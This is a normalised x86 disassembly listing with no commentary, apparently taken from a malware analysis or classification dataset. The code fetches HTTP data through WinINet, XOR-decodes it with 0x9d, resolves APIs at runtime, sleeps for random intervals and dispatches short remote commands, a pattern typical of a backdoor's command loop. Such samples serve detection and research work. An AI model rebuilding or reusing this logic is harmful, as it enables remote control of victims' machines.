mov eax [ rw-data ]
cmp eax edi
je r-xdata
push eax
call esi
mov [ rw-data ] edi
pop edi
pop esi
retn
push eax
call esi
mov [ rw-data ] edi
sub_10004c10
push 0xffffffff
push sub_1001e5dc
mov eax [ fs : 0x0 ]
push eax
mov eax 0x10680
call sub_10017e00
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x10678 ] eax
push ebx
push ebp
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x10694 ]
mov [ fs : 0x0 ] eax
mov ebp [ esp + 0x106a4 ]
xor ebx ebx
push 0x7ff
lea eax [ esp + 0x8691 ]
mov esi ecx
push ebx
push eax
mov [ esp + 0x30 ] esi
mov [ esp + 0x8698 ] bl
call sub_1000fe10
mov eax [ ebp + 0x14218 ]
add esp 0xc
mov [ esp + 0x30 ] 0x800
mov [ esp + 0x34 ] ebx
mov [ esp + 0x20 ] ebx
mov [ esp + 0x1c ] 0x4
cmp eax ebx
je r-xdata
xor eax eax
jmp r-xdata
lea ecx [ esp + 0x20 ]
push ecx
lea edx [ esp + 0x20 ]
push edx
lea ecx [ esp + 0x3c ]
push ecx
push 0x20000013
push eax
call [ HttpQueryInfoA@IAT ]
cmp eax 0x1
jne r-xdata
mov ecx [ esp + 0x10694 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebp
pop ebx
mov ecx [ esp + 0x10678 ]
xor ecx esp
call sub_1000c0a5
add esp 0x1068c
retn
mov eax [ esp + 0x34 ]
cmp eax 0x194
jne r-xdata
cmp eax 0x1f8
jne r-xdata
lea edx [ esp + 0x868c ]
push edx
lea edi [ esp + 0x34 ]
mov ebx ebp
call sub_1000c030
test eax eax
jne r-xdata
cmp eax 0xc8
jne r-xdata
mov [ rw-data ] 0x11
xor eax eax
jmp r-xdata
xor ebx ebx
push 0x7f
lea eax [ esp + 0x8491 ]
push ebx
push eax
mov [ esp + 0x8498 ] bl
call sub_1000fe10
xor eax eax
add esp 0xc
lea ecx [ esp + 0x848c ]
push ecx
mov edx r--data
lea ecx [ esp + 0x8690 ]
mov [ esp + 0x8410 ] bl
mov [ esp + 0x8411 ] eax
mov [ esp + 0x8415 ] eax
mov [ esp + 0x8419 ] eax
mov [ esp + 0x841d ] eax
mov [ esp + 0x8421 ] eax
mov [ esp + 0x8425 ] eax
mov [ esp + 0x8429 ] eax
mov [ esp + 0x842d ] ax
mov [ esp + 0x842f ] al
mov [ esp + 0x8430 ] bl
mov [ esp + 0x8431 ] eax
mov [ esp + 0x8435 ] eax
mov [ esp + 0x8439 ] eax
mov [ esp + 0x843d ] eax
mov [ esp + 0x8441 ] eax
mov [ esp + 0x8445 ] eax
mov [ esp + 0x8449 ] eax
mov [ esp + 0x844d ] ax
mov [ esp + 0x844f ] al
call sub_1000b4e0
lea edx [ esp + 0x840c ]
push edx
mov edx r--data
lea ecx [ esp + 0x8690 ]
call sub_1000b4e0
lea eax [ esp + 0x842c ]
push eax
lea ecx [ esp + 0x8490 ]
call sub_1000b870
lea ecx [ esp + 0x840c ]
lea eax [ esp + 0x842c ]
mov [ rw-data ] 0x14
lea edx [ esp + 0x868c ]
mov [ rw-data ] ebx
push edx
lea edi [ esp + 0x34 ]
mov ebx ebp
call sub_1000c030
test eax eax
je r-xdata
sbb eax eax
sbb eax 0xffffffff
cmp dl bl
je r-xdata
xor ebx ebx
push 0x27ff
lea eax [ esp + 0xde91 ]
push ebx
push eax
mov [ esp + 0x34 ] ebx
mov [ esp + 0x28 ] ebx
xor esi esi
mov [ esp + 0xde98 ] bl
call sub_1000fe10
add esp 0xc
push 0x27ff
lea ecx [ esp + 0x8e91 ]
push ebx
push ecx
mov [ esp + 0x8e98 ] bl
call sub_1000fe10
add esp 0xc
lea edx [ esp + 0x28 ]
push edx
mov eax ebp
call sub_1000bfe0
mov edi [ InternetQueryDataAvailable@IAT ]
push r--data
lea ecx [ esp + 0x8410 ]
call sub_10008b20
mov ebx 0x1
lea ecx [ esp + 0x868c ]
mov edx esi
mov [ esp + 0x1069c ] ebx
call sub_1000b1a0
mov edi [ esp + 0x24 ]
lea esi [ esp + 0x38 ]
call sub_1000b370
or esi 0xffffffff
push esi
push 0x0
push eax
lea ecx [ esp + 0x8418 ]
mov [ esp + 0x106a8 ] 0x2
call sub_10008f60
lea ecx [ esp + 0x38 ]
mov [ esp + 0x1069c ] bl
call sub_10008b60
cmp [ esp + 0x8424 ] 0x10
mov eax [ esp + 0x8410 ]
jae r-xdata
mov eax [ rw-data ]
inc eax
lea esi [ eax + 0x1 ]
imul esi eax
mov [ rw-data ] eax
cmp esi 0x1e
jbe r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
cmp dl [ ecx + 0x1 ]
jne r-xdata
call [ GetLastError@IAT ]
mov [ ebp ] eax
xor eax eax
jmp r-xdata
mov eax [ esp + 0x18 ]
lea edx [ esp + 0x1c ]
push edx
mov edx [ ebp + 0x14218 ]
push eax
lea ecx [ esp + esi + 0xde94 ]
push ecx
push edx
call [ InternetReadFile@IAT ]
test eax eax
je r-xdata
push eax
mov edi ebp
call sub_10005530
add esp 0x4
test eax eax
je r-xdata
lea eax [ esp + 0x8410 ]
mov edi 0x8
cmp eax 0x8
ja r-xdata
mov esi 0x1e
cmp eax ebx
jne r-xdata
add eax 0x2
add ecx 0x2
cmp dl bl
jne r-xdata
add esi [ esp + 0x1c ]
cmp esi [ esp + 0x28 ]
jb r-xdata
lea ecx [ esp + 0x840c ]
mov [ esp + 0x1069c ] esi
call sub_10008b60
xor eax eax
jmp r-xdata
push 0x0
push ebp
call sub_10004680
add esp 0x8
lea ecx [ esp + 0x840c ]
mov [ esp + 0x1069c ] esi
call sub_10008b60
mov eax ebx
jmp r-xdata
push ebx
call sub_1000def1
add esp 0x4
push eax
call sub_1000db26
add esp 0x4
call sub_1000db38
xor edx edx
div edi
mov ecx [ rw-data ]
add edx esi
imul edx edx 0x3e8
push edx
push ecx
call [ WaitForSingleObject@IAT ]
test eax eax
je r-xdata
mov edi eax
mov dl [ eax ]
cmp dl [ ecx ]
jne r-xdata
mov ecx [ ebp + 0x14218 ]
push ebx
push ebx
lea eax [ esp + 0x20 ]
push eax
push ecx
mov [ esp + 0x28 ] ebx
call edi
test eax eax
je r-xdata
push 0x3f
lea eax [ esp + 0x8451 ]
push ebx
push eax
mov [ esp + 0x8458 ] bl
call sub_1000fe10
add esp 0xc
lea ecx [ esp + 0x844c ]
push ecx
lea edx [ esp + 0x30 ]
mov eax ebp
mov [ esp + 0x30 ] 0x40
call sub_1000bfa0
test eax eax
je r-xdata
mov eax rw-data
lea edx [ eax + 0x1 ]
lea esp [ esp ]
lea ecx [ esp + 0x8e8c ]
push ecx
lea ecx [ esp + 0xde90 ]
call sub_1000b870
mov eax [ esp + 0x28 ]
lea edx [ esp + 0x20 ]
push edx
push eax
lea ecx [ esp + 0x20 ]
lea edx [ esp + 0xde94 ]
lea eax [ esp + 0x5c ]
mov [ esp + 0x28 ] ebx
mov [ esp + 0x20 ] ebx
call sub_10002310
push 0x27ff
lea ecx [ esp + 0xb691 ]
push ebx
push ecx
mov [ esp + 0xb698 ] bl
call sub_1000fe10
mov edx [ esp + 0x2c ]
mov eax [ esp + 0x24 ]
add esp 0xc
push edx
push eax
lea ecx [ esp + 0xb694 ]
push ecx
call sub_100109a0
add esp 0xc
lea edx [ esp + 0x8e8c ]
push edx
lea ecx [ esp + 0xb690 ]
call sub_1000b870
mov eax [ esp + 0x18 ]
push eax
call sub_1000ced5
add esp 0x4
mov [ esp + 0x18 ] ebx
jmp r-xdata
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
je r-xdata
push 0x2
lea ecx [ esp + 0x8408 ]
push r--data
push ecx
call sub_1000d320
add esp 0xc
test eax eax
jne r-xdata
push ebp
call sub_100056d0
add esp 0x4
jmp r-xdata
xor eax eax
lea edx [ esp + 0x8404 ]
push edx
mov edx r--data
lea ecx [ esp + 0x8e90 ]
mov [ esp + 0x8408 ] bl
mov [ esp + 0x8409 ] eax
mov [ esp + 0x840d ] ax
mov [ esp + 0x840f ] al
call sub_1000b4e0
push 0x2
lea eax [ esp + 0x8408 ]
push r--data
push eax
call sub_1000d320
add esp 0xc
test eax eax
jne r-xdata
push ebx
push ebp
call sub_10004680
add esp 0x8
mov [ rw-data ] 0x3
jmp r-xdata
push rw-data
lea ecx [ esp + 0x8410 ]
call sub_10008b20
push 0x100
push ebx
push rw-data
mov [ esp + 0x106a8 ] ebx
call sub_1000fe10
add esp 0xc
push 0xff
lea edx [ esp + 0x8491 ]
push ebx
push edx
mov [ esp + 0x8498 ] bl
call sub_1000fe10
mov edi [ esp + 0x841c ]
add esp 0xc
cmp [ esp + 0x8424 ] 0x10
jae r-xdata
push 0x2
lea edx [ esp + 0x8408 ]
push r--data
push edx
call sub_1000d320
add esp 0xc
test eax eax
jne r-xdata
push ebp
lea ecx [ esp + 0x8e90 ]
call sub_10005870
add esp 0x4
jmp r-xdata
mov eax 0x1
lea eax [ esp + 0x848c ]
push eax
call sub_1000b7b0
lea ecx [ esp + 0x848c ]
push ecx
push ebp
call sub_10004680
add esp 0x8
lea ecx [ esp + 0x840c ]
mov [ esp + 0x1069c ] 0xffffffff
call sub_10008b60
mov [ rw-data ] 0x3
jmp r-xdata
lea edi [ esp + 0x8410 ]
push 0x2
lea ecx [ esp + 0x8408 ]
push r--data
push ecx
call sub_1000d320
add esp 0xc
test eax eax
jne r-xdata
mov eax [ esp + 0x24 ]
push eax
push ebp
lea ecx [ esp + 0x8e94 ]
call sub_10005a30
add esp 0x8
jmp r-xdata
push 0x2
lea eax [ esp + 0x8408 ]
push r--data
push eax
call sub_1000d320
add esp 0xc
test eax eax
jne r-xdata
mov edx [ esp + 0x24 ]
push edx
push ebp
lea ecx [ esp + 0x8e94 ]
call sub_100061a0
add esp 0x8
jmp r-xdata
push 0x2
lea ecx [ esp + 0x8408 ]
push r--data
push ecx
call sub_1000d320
add esp 0xc
test eax eax
jne r-xdata
push ebp
lea ecx [ esp + 0x8e90 ]
call sub_10006740
add esp 0x4
jmp r-xdata
push 0x3
lea edx [ esp + 0x8408 ]
push r--data
push edx
call sub_1000d320
add esp 0xc
test eax eax
jne r-xdata
push ebp
lea ecx [ esp + 0x8e90 ]
call sub_10006c80
add esp 0x4
jmp r-xdata
push 0x3
lea eax [ esp + 0x8408 ]
push r--data
push eax
call sub_1000d320
add esp 0xc
test eax eax
jne r-xdata
push ebp
call sub_10006e70
add esp 0x4
jmp r-xdata
push 0x2
lea ecx [ esp + 0x8408 ]
push r--data
push ecx
call sub_1000d320
add esp 0xc
test eax eax
jne r-xdata
push ebp
lea ecx [ esp + 0x8e90 ]
call sub_10006fb0
add esp 0x4
jmp r-xdata
push 0x2
lea edx [ esp + 0x8408 ]
push r--data
push edx
call sub_1000d320
add esp 0xc
test eax eax
jne r-xdata
lea ecx [ esp + 0x8e8c ]
call sub_10007530
jmp r-xdata
push 0x2
lea eax [ esp + 0x8408 ]
push r--data
push eax
call sub_1000d320
add esp 0xc
test eax eax
jne r-xdata
push ebp
lea ecx [ esp + 0x8e90 ]
call sub_10007ae0
add esp 0x4
jmp r-xdata
push 0x2
lea ecx [ esp + 0x8408 ]
push r--data
push ecx
call sub_1000d320
add esp 0xc
test eax eax
jne r-xdata
mov esi ebp
call sub_100075d0
jmp r-xdata
push 0x2
lea edx [ esp + 0x8408 ]
push r--data
push edx
call sub_1000d320
add esp 0xc
test eax eax
jne r-xdata
push ebp
lea ecx [ esp + 0x8e90 ]
call sub_100076c0
add esp 0x4
jmp r-xdata
push r--data
lea ecx [ esp + 0x3c ]
call sub_10008b20
push 0xff
lea eax [ esp + 0x8591 ]
push ebx
mov [ esp + 0x106a4 ] 0x3
push eax
mov [ esp + 0x8598 ] bl
call sub_1000fe10
mov edi [ esp + 0x48 ]
add esp 0xc
cmp [ esp + 0x50 ] 0x10
jae r-xdata
push ebp
lea ecx [ esp + 0x8e90 ]
call sub_10007f70
add esp 0x4
jmp r-xdata
lea ecx [ esp + 0x858c ]
push ecx
call sub_1000b7b0
lea edx [ esp + 0x858c ]
push edx
push ebp
call sub_10004680
add esp 0x8
lea ecx [ esp + 0x38 ]
mov [ esp + 0x1069c ] 0xffffffff
call sub_10008b60
lea edi [ esp + 0x3c ]
sub_10005530
mov eax 0x2018
call sub_10017e00
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x2014 ] eax
mov eax [ esp + 0x201c ]
push ebx
push esi
push r--data
push eax
call sub_1000c1e0
mov esi eax
xor ebx ebx
add esp 0x8
cmp esi ebx
jne r-xdata
push ebp
push 0x2
push ebx
push esi
call sub_1000c96a
push 0x1fff
lea eax [ esp + 0x31 ]
push ebx
push eax
mov [ esp + 0x28 ] ebx
mov [ esp + 0x24 ] ebx
xor ebp ebp
mov [ esp + 0x2c ] ebx
mov [ esp + 0x38 ] bl
call sub_1000fe10
mov eax [ edi + 0x14218 ]
add esp 0x18
mov [ esp + 0x18 ] ebx
mov [ esp + 0x1c ] 0x4
cmp eax ebx
je r-xdata
pop esi
xor eax eax
pop ebx
mov ecx [ esp + 0x2014 ]
xor ecx esp
call sub_1000c0a5
add esp 0x2018
retn
mov eax [ edi + 0x14218 ]
push ebx
push ebx
lea edx [ esp + 0x1c ]
push edx
push eax
call [ InternetQueryDataAvailable@IAT ]
test eax eax
je r-xdata
lea ecx [ esp + 0x18 ]
push ecx
lea edx [ esp + 0x20 ]
push edx
lea ecx [ esp + 0x18 ]
push ecx
push 0x20000005
push eax
call [ HttpQueryInfoA@IAT ]
call [ GetLastError@IAT ]
pop ebp
pop esi
mov [ edi ] eax
xor eax eax
pop ebx
mov ecx [ esp + 0x2014 ]
xor ecx esp
call sub_1000c0a5
add esp 0x2018
retn
mov edx [ esp + 0x14 ]
lea ecx [ esp + 0xc ]
push ecx
mov ecx [ edi + 0x14218 ]
push edx
lea eax [ esp + 0x28 ]
push eax
push ecx
call [ InternetReadFile@IAT ]
test eax eax
je r-xdata
mov ecx [ esp + 0xc ]
xor eax eax
cmp ecx ebx
jbe r-xdata
push esi
push 0x1
push ecx
lea edx [ esp + 0x2c ]
push edx
call sub_1000c653
push esi
call sub_1000c0e8
add esp 0x14
test eax eax
jne r-xdata
xor [ esp + eax + 0x20 ] 0x9d
inc eax
cmp eax ecx
jb r-xdata
push esi
call sub_1000ca66
mov ecx [ esp + 0x2024 ]
add esp 0x4
pop ebp
pop esi
pop ebx
xor ecx esp
mov [ rw-data ] 0x15
xor eax eax
call sub_1000c0a5
add esp 0x2018
retn
add ebp [ esp + 0xc ]
cmp ebp [ esp + 0x10 ]
jb r-xdata
push esi
call sub_1000ca66
add esp 0x4
pop ebp
pop esi
mov eax 0x1
pop ebx
mov ecx [ esp + 0x2014 ]
xor ecx esp
call sub_1000c0a5
add esp 0x2018
retn
sub_100056d0
push 0xffffffff
push sub_1001de78
mov eax [ fs : 0x0 ]
push eax
sub esp 0x30
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x28 ] eax
push ebx
push ebp
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x44 ]
mov [ fs : 0x0 ] eax
mov ebp [ esp + 0x54 ]
xor eax eax
mov [ esp + 0x1c ] eax
push 0x14000
push eax
lea esi [ ebp + 0x4 ]
mov [ esp + 0x54 ] eax
push esi
mov [ ebp + 0x14004 ] eax
call sub_1000fe10
add esp 0xc
push r--data
push r--data
call [ GetModuleHandleA@IAT ]
push eax
call [ GetProcAddress@IAT ]
mov [ esp + 0x18 ] eax
push esi
lea eax [ esp + 0x1c ]
push eax
call sub_1000a370
push r--data
mov ebx r--data
mov edi r--data
lea esi [ esp + 0x24 ]
call sub_10004ad0
mov eax [ esp + 0x28 ]
add esp 0x4
cmp [ esp + 0x38 ] 0x10
jae r-xdata
mov ebx r--data
mov esi ebp
call sub_1000bc40
mov ebx r--data
mov edi r--data
call sub_1000bd50
mov ebx r--data
mov edi r--data
call sub_1000bd50
mov ebx r--data
mov edi r--data
call sub_1000bd50
mov ebx r--data
mov edi r--data
call sub_1000bd50
mov ebx r--data
mov edi r--data
call sub_1000bd50
lea eax [ ebp + 0x4 ]
lea edx [ eax + 0x1 ]
lea eax [ esp + 0x24 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
mov [ ebp + 0x14004 ] eax
je r-xdata
cmp [ esp + 0x38 ] 0x10
mov [ ebp + 0x1420c ] 0x8
jb r-xdata
mov ecx 0xfffffffc
lea eax [ ebp + 0x4 ]
sub ecx ebp
xor eax eax
mov [ esp + 0x38 ] 0xf
mov [ esp + 0x34 ] eax
mov [ esp + 0x24 ] al
cmp [ esp + 0x1c ] eax
jne r-xdata
mov eax [ esp + 0x24 ]
push eax
call sub_1000c4b4
add esp 0x4
xor [ eax ] 0x9d
inc eax
lea edx [ ecx + eax ]
cmp edx [ ebp + 0x14004 ]
jb r-xdata
mov eax 0x1
mov ecx [ esp + 0x44 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebp
pop ebx
mov ecx [ esp + 0x28 ]
xor ecx esp
call sub_1000c0a5
add esp 0x3c
retn
push eax
call sub_1000ced5
add esp 0x4
sub_10005870
push 0xffffffff
push sub_1001e506
mov eax [ fs : 0x0 ]
push eax
sub esp 0x140
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x138 ] eax
push ebx
push ebp
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x154 ]
mov [ fs : 0x0 ] eax
mov ebp [ esp + 0x164 ]
xor ebx ebx
push 0xff
lea eax [ esp + 0x51 ]
push ebx
push eax
mov esi ecx
mov [ esp + 0x58 ] bl
call sub_1000fe10
xor eax eax
add esp 0xc
mov [ esp + 0x3c ] bl
mov [ esp + 0x3d ] eax
mov [ esp + 0x41 ] eax
mov [ esp + 0x45 ] eax
mov [ esp + 0x49 ] ax
mov [ esp + 0x4b ] al
mov [ esp + 0x1c ] ebx
push r--data
push r--data
mov [ esp + 0x164 ] ebx
call [ GetModuleHandleA@IAT ]
push eax
call [ GetProcAddress@IAT ]
lea ecx [ esp + 0x3c ]
push ecx
mov edx r--data
mov ecx esi
mov [ esp + 0x1c ] eax
call sub_1000b4e0
lea edx [ esp + 0x3c ]
push edx
call sub_1000d5f3
add esp 0x4
cmp eax ebx
jne r-xdata
push eax
call sub_1000a770
lea eax [ esp + 0x3c ]
lea ecx [ esp + 0x18 ]
call sub_1000a7d0
jmp r-xdata
push 0xc
push r--data
push 0xd
push r--data
jmp r-xdata
mov [ esp + 0x38 ] 0xf
mov [ esp + 0x34 ] ebx
mov [ esp + 0x24 ] bl
mov [ esp + 0x15c ] 0x1
lea ecx [ esp + 0x20 ]
cmp eax ebx
je r-xdata
lea eax [ esp + 0x4c ]
push eax
call sub_1000b7b0
lea ecx [ esp + 0x4c ]
push ecx
push ebp
call sub_10004680
add esp 0x8
mov [ esp + 0x15c ] bl
cmp [ esp + 0x38 ] esi
jb r-xdata
lea edi [ esp + 0x24 ]
call sub_10009630
mov edi [ esp + 0x24 ]
mov esi 0x10
cmp [ esp + 0x38 ] esi
jae r-xdata
mov [ esp + 0x38 ] 0xf
mov [ esp + 0x34 ] ebx
mov [ esp + 0x24 ] bl
cmp [ esp + 0x1c ] ebx
jne r-xdata
mov edx [ esp + 0x24 ]
push edx
call sub_1000c4b4
add esp 0x4
mov eax 0x1
mov ecx [ esp + 0x154 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebp
pop ebx
mov ecx [ esp + 0x138 ]
xor ecx esp
call sub_1000c0a5
add esp 0x14c
retn
push ebx
call sub_1000ced5
add esp 0x4
sub_10005a30
push 0xffffffff
push sub_1001e4b8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x7bc
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x7b8 ] eax
push ebx
push ebp
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x7d0 ]
mov [ fs : 0x0 ] eax
mov eax [ esp + 0x7e0 ]
mov ebp [ esp + 0x7e4 ]
xor ebx ebx
push 0xff
mov edi ecx
lea ecx [ esp + 0x2d1 ]
push ebx
push ecx
mov [ esp + 0x20 ] eax
mov [ esp + 0x2d8 ] bl
call sub_1000fe10
add esp 0xc
push 0xff
lea edx [ esp + 0x1d1 ]
push ebx
push edx
mov [ esp + 0x1d8 ] bl
call sub_1000fe10
xor eax eax
mov [ esp + 0xb9 ] eax
mov [ esp + 0xbd ] eax
mov [ esp + 0xc1 ] eax
mov [ esp + 0xc5 ] ax
mov [ esp + 0xc7 ] al
add esp 0xc
lea eax [ esp + 0x2cc ]
push eax
mov edx r--data
mov ecx edi
mov [ esp + 0xb0 ] bl
call sub_1000b4e0
lea ecx [ esp + 0x1cc ]
push ecx
mov edx r--data
mov ecx edi
call sub_1000b4e0
lea edx [ esp + 0xac ]
push edx
mov edx r--data
mov ecx edi
call sub_1000b4e0
lea eax [ esp + 0xac ]
push eax
call sub_1000d5f3
add esp 0x4
lea ecx [ esp + 0x1cc ]
push r--data
push ecx
mov edi eax
call sub_1000c1e0
mov esi eax
add esp 0x8
cmp esi ebx
jne r-xdata
push 0x2
push ebx
push esi
call sub_1000c96a
add esp 0xc
push esi
call sub_1000c872
add esp 0x4
cmp eax edi
jbe r-xdata
lea edx [ esp + 0x1cc ]
push r--data
push edx
call sub_1000c1e0
mov esi eax
add esp 0x8
cmp esi ebx
jne r-xdata
push esi
call sub_1000ca66
add esp 0x4
lea eax [ esp + 0x1cc ]
push r--data
push eax
call sub_1000c1e0
mov esi eax
add esp 0x8
mov [ esp + 0x1c ] esi
cmp esi ebx
jne r-xdata
mov eax 0xf
mov [ esp + 0x70 ] eax
mov [ esp + 0x6c ] ebx
mov [ esp + 0x5c ] bl
mov [ esp + 0x7d8 ] 0x2
mov [ esp + 0x38 ] eax
mov [ esp + 0x34 ] ebx
mov [ esp + 0x24 ] bl
push 0x26
push r--data
lea ecx [ esp + 0x28 ]
mov [ esp + 0x7e0 ] 0x3
call sub_10009630
push 0xff
lea eax [ esp + 0xd1 ]
push ebx
push eax
mov [ esp + 0xd8 ] bl
call sub_1000fe10
mov edi [ esp + 0x30 ]
mov ebp 0x10
add esp 0xc
cmp [ esp + 0x38 ] ebp
jae r-xdata
mov ebp 0xf
mov [ esp + 0x70 ] ebp
mov [ esp + 0x6c ] ebx
mov [ esp + 0x5c ] bl
mov [ esp + 0x7d8 ] ebx
mov [ esp + 0x38 ] ebp
mov [ esp + 0x34 ] ebx
mov [ esp + 0x24 ] bl
push 0x1e
push r--data
lea ecx [ esp + 0x28 ]
mov [ esp + 0x7e0 ] 0x1
call sub_10009630
push 0xff
lea eax [ esp + 0xd1 ]
push ebx
push eax
mov [ esp + 0xd8 ] bl
call sub_1000fe10
mov edi [ esp + 0x30 ]
mov esi 0x10
add esp 0xc
cmp [ esp + 0x38 ] esi
jae r-xdata
push 0x2
push ebx
push esi
call sub_1000c96a
add esp 0xc
push esi
call sub_1000c872
add esp 0x4
push 0x3ff
lea ecx [ esp + 0x3d1 ]
push ebx
push ecx
mov [ esp + 0x24 ] eax
mov [ esp + 0xc8 ] bl
mov [ esp + 0xc9 ] ebx
mov [ esp + 0xcd ] ebx
mov [ esp + 0xd1 ] ebx
mov [ esp + 0xd5 ] bx
mov [ esp + 0xd7 ] bl
mov [ esp + 0x3d8 ] bl
call sub_1000fe10
add esp 0xc
push ebx
push r--data
lea ecx [ esp + 0x7c ]
mov [ esp + 0x94 ] 0xf
mov [ esp + 0x90 ] ebx
mov [ esp + 0x80 ] bl
call sub_10009630
lea ebx [ esp + 0x2cc ]
mov edi r--data
lea esi [ esp + 0x74 ]
mov [ esp + 0x7d8 ] 0x6
call sub_10004540
lea ebx [ esp + 0x1cc ]
mov edi r--data
call sub_10004540
mov eax [ esp + 0x18 ]
push 0xa
lea edx [ esp + 0xc0 ]
push edx
push eax
call sub_1001c7f2
add esp 0xc
lea ebx [ esp + 0xbc ]
mov edi r--data
call sub_10004540
mov edi ebp
call sub_1000b770
cmp [ esp + 0x8c ] 0x10
mov edi [ esp + 0x78 ]
jae r-xdata
mov ebp 0xf
mov [ esp + 0x70 ] ebp
mov [ esp + 0x6c ] ebx
mov [ esp + 0x5c ] bl
mov [ esp + 0x7d8 ] 0x4
mov [ esp + 0x38 ] ebp
mov [ esp + 0x34 ] ebx
mov [ esp + 0x24 ] bl
push 0x2e
push r--data
lea ecx [ esp + 0x28 ]
mov [ esp + 0x7e0 ] 0x5
call sub_10009630
push 0xff
lea ecx [ esp + 0xd1 ]
push ebx
push ecx
mov [ esp + 0xd8 ] bl
call sub_1000fe10
mov edi [ esp + 0x30 ]
mov esi 0x10
add esp 0xc
cmp [ esp + 0x38 ] esi
jae r-xdata
lea ecx [ esp + 0xcc ]
push ecx
call sub_1000b7b0
mov eax [ esp + 0x14 ]
lea edx [ esp + 0xcc ]
push edx
push eax
call sub_10004680
push esi
call sub_1000ca66
add esp 0xc
mov [ esp + 0x7d8 ] 0x2
cmp [ esp + 0x38 ] ebp
jb r-xdata
lea edi [ esp + 0x24 ]
lea ecx [ esp + 0xcc ]
push ecx
call sub_1000b7b0
mov eax [ esp + 0x14 ]
lea edx [ esp + 0xcc ]
push edx
push eax
call sub_10004680
add esp 0x8
mov [ esp + 0x7d8 ] bl
cmp [ esp + 0x38 ] esi
jb r-xdata
lea edi [ esp + 0x24 ]
lea ecx [ esp + 0x3cc ]
push ecx
call sub_1000b7b0
push ebp
lea edi [ esp + 0x3d0 ]
mov ecx r--data
call sub_1000aad0
push ebp
mov edi r--data
mov ecx r--data
call sub_1000aad0
mov ebx ebp
call sub_1000ad00
xor eax eax
push eax
push r--data
lea ecx [ esp + 0x44 ]
mov [ esp + 0x5c ] 0xf
mov [ esp + 0x58 ] eax
mov [ esp + 0x48 ] al
call sub_10009630
mov ebx r--data
mov edi r--data
lea esi [ esp + 0x3c ]
mov [ esp + 0x7d8 ] 0x7
call sub_10004540
push 0x0
call sub_1000def1
add esp 0x4
push eax
call sub_1000db26
add esp 0x4
call sub_1000db38
cdq
mov ecx 0xf4240
idiv ecx
mov ebx 0x59e074
mov edi r--data
add edx 0x1e8480
mov ecx edx
sub ebx edx
call sub_100045a0
mov ecx ebx
mov edi r--data
call sub_100045a0
mov ebx r--data
mov edi r--data
call sub_10004540
mov ebx r--data
mov edi r--data
call sub_10004540
mov ebx r--data
mov edi r--data
call sub_10004540
mov ebx rw-data
mov edi r--data
call sub_10004540
cmp [ esp + 0x54 ] 0x10
mov ebx [ esp + 0x40 ]
jae r-xdata
lea edi [ esp + 0x78 ]
lea edx [ esp + 0xcc ]
push edx
call sub_1000b7b0
mov ecx [ esp + 0x14 ]
lea eax [ esp + 0xcc ]
push eax
push ecx
call sub_10004680
add esp 0x8
mov [ esp + 0x7d8 ] 0x4
cmp [ esp + 0x38 ] esi
jb r-xdata
lea edi [ esp + 0x24 ]
mov [ esp + 0x7d8 ] 0xffffffff
mov [ esp + 0x38 ] 0xf
mov [ esp + 0x34 ] ebx
mov [ esp + 0x24 ] bl
cmp [ esp + 0x70 ] ebp
jb r-xdata
mov ecx [ esp + 0x24 ]
push ecx
call sub_1000c4b4
add esp 0x4
mov [ esp + 0x7d8 ] 0xffffffff
mov [ esp + 0x38 ] ebp
mov [ esp + 0x34 ] ebx
mov [ esp + 0x24 ] bl
cmp [ esp + 0x70 ] esi
jb r-xdata
mov ecx [ esp + 0x24 ]
push ecx
call sub_1000c4b4
add esp 0x4
push r--data
mov edi r--data
lea esi [ esp + 0x94 ]
call sub_10004ad0
mov eax [ esp + 0x98 ]
add esp 0x4
cmp [ esp + 0xa8 ] 0x10
jae r-xdata
lea ebx [ esp + 0x40 ]
mov [ esp + 0x7d8 ] 0xffffffff
mov [ esp + 0x38 ] ebp
mov [ esp + 0x34 ] ebx
mov [ esp + 0x24 ] bl
cmp [ esp + 0x70 ] esi
jb r-xdata
mov edx [ esp + 0x24 ]
push edx
call sub_1000c4b4
add esp 0x4
mov eax 0x1
mov ecx [ esp + 0x7d0 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebp
pop ebx
mov ecx [ esp + 0x7b8 ]
xor ecx esp
call sub_1000c0a5
add esp 0x7c8
retn
mov edx [ esp + 0x5c ]
jmp r-xdata
mov edx [ esp + 0x5c ]
jmp r-xdata
mov esi [ esp + 0x14 ]
mov ebx r--data
call sub_1000bc40
mov ebx r--data
mov edi r--data
call sub_1000bd50
cmp [ ebp + 0x18 ] 0x10
jb r-xdata
lea eax [ esp + 0x94 ]
mov eax [ esp + 0x5c ]
push eax
jmp r-xdata
push edx
lea ebx [ ebp + 0x4 ]
mov ebx [ ebp + 0x4 ]
jmp r-xdata
call sub_1000c4b4
add esp 0x4
xor ebx ebx
mov edi 0xf
mov [ esp + 0x7d8 ] 0x6
mov [ esp + 0xa8 ] edi
mov [ esp + 0xa4 ] ebx
mov [ esp + 0x94 ] bl
cmp [ esp + 0x54 ] esi
jb r-xdata
mov eax [ esp + 0x94 ]
push eax
call sub_1000c4b4
add esp 0x4
mov edi r--data
call sub_1000bd50
mov ebx r--data
mov edi r--data
call sub_1000bd50
mov ebx r--data
mov edi r--data
call sub_1000bd50
mov ebx r--data
mov edi r--data
call sub_1000bd50
mov edx [ esp + 0x1c ]
push edx
mov [ esi + 0x1420c ] 0x7
call sub_1000ca66
mov esi 0x10
add esp 0x4
cmp [ esp + 0xa8 ] esi
jb r-xdata
mov [ esp + 0x7d8 ] 0xffffffff
mov [ esp + 0x54 ] edi
mov [ esp + 0x50 ] ebx
